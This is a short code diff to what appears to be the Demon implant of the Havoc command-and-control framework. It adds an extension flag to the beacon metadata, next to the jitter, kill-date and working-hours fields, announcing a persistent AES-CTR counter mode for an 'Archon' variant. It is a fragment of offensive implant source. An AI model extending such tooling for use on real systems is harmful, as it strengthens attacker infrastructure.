@@ -262,6 +262,12 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     PackageAddInt32( *MetaData, Instance->Config.Jitter );
     PackageAddInt64( *MetaData, Instance->Config.Transport.KillDate );
     PackageAddInt32( *MetaData, Instance->Config.Transport.WorkingHours );
+
+    /* Archon extension flags (u32, big-endian).  Setting MONOTONIC_CTR
+     * tells the teamserver that Archon uses a persistent CTR offset across
+     * packets instead of resetting to block 0 on every transmission.
+     * The teamserver will register this agent with legacy_ctr = false. */
+    PackageAddInt32( *MetaData, DEMON_INITIALIZE_EXT_MONOTONIC_CTR );
 }
 
 VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
